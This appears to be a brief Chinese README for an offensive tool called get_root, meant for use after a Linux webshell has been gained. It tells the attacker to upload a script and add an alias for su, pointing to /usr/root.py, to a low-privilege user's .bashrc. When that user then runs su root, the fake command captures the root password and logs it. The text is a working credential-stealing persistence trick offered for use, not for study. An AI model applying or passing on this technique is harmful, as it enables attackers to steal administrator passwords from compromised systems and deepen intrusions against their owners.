# get_root
在拿到webshell 提权无效时（普通用户不能拿到root权限），可以执行get_root获得root权限

渗透linux拿到低权限并提权无果时，将这个程序传上去，再将一个低权限用户目录下的.bashrc添加一句alias su=’/usr/root.py’; 低权限用户su root 后 成功记录密码。密码记录路径请看脚本
